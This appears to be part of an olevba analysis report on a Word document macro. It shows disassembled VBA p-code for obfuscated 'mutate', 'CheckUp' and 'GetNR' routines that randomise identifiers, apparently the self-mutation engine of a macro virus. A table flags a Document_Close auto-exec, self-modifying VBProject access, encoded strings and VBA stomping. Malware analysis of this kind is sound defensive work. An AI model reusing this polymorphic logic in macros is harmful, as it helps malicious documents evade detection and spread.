' Line #137:
' 	Ld xjhhdn_ 
' 	LitDI2 0x0002 
' 	Eq 
' 	LoopWhile 
' Line #138:
' 	StartForVariable 
' 	Ld pjw_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld kov_ 
' 	For 
' Line #139:
' 	Ld pjw_ 
' 	ArgsLd xnkwv_ 0x0001 
' 	Ld lnfqm_ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld pjw_ 
' 	St xjhhdn_ 
' 	EndIf 
' Line #140:
' 	StartForVariable 
' 	Next 
' Line #141:
' 	Ld vfy_ 
' 	FnLen 
' 	St mf_ 
' Line #142:
' 	Ld vfy_ 
' 	Ld mf_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd CheckUp 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	DoWhile 
' Line #143:
' 	Ld mf_ 
' 	LitDI2 0x0001 
' 	Sub 
' 	St mf_ 
' Line #144:
' 	Loop 
' Line #145:
' 	Ld vfy_ 
' 	Ld mf_ 
' 	ArgsLd LBound 0x0002 
' 	Ld xjhhdn_ 
' 	ArgsLd szimks_ 0x0001 
' 	Add 
' 	St vfy_ 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	EndIfBlock 
' Line #148:
' 	Ld vfy_ 
' 	Ld ai_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St vfy_ 
' Line #149:
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St gcaiuh_ 
' Line #150:
' 	Loop 
' Line #151:
' 	Ld vfy_ 
' 	St mutate 
' Line #152:
' 	EndFunc 
' Line #153:
' 	FuncDefn (Private Function CheckUp(cyqjdmfz_, id_FFFE As Variant))
' Line #154:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #155:
' 	OnError (Resume Next) 
' Line #156:
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "A"
' 	Ge 
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0001 "Z"
' 	Le 
' 	And 
' 	IfBlock 
' Line #157:
' 	LitDI2 0x0002 
' 	St mgi_ 
' Line #158:
' 	ElseBlock 
' Line #159:
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "0"
' 	Ge 
' 	Ld cyqjdmfz_ 
' 	Ld gcaiuh_ 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "9"
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St mgi_ 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	St mgi_ 
' 	EndIf 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	Ld mgi_ 
' 	St CheckUp 
' Line #162:
' 	EndFunc 
' Line #163:
' 	FuncDefn (Private Function GetNR(id_FFFE As Variant))
' Line #164:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #165:
' 	OnError (Resume Next) 
' Line #166:
' 	LitStr 0x0000 ""
' 	St bu_ 
' Line #167:
' 	StartForVariable 
' 	Ld gcaiuh_ 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	For 
' Line #168:
' 	Ld bu_ 
' 	LitDI2 0x0061 
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St bu_ 
' Line #169:
' 	StartForVariable 
' 	Next 
' Line #170:
' 	Ld bu_ 
' 	St GetNR 
' Line #171:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

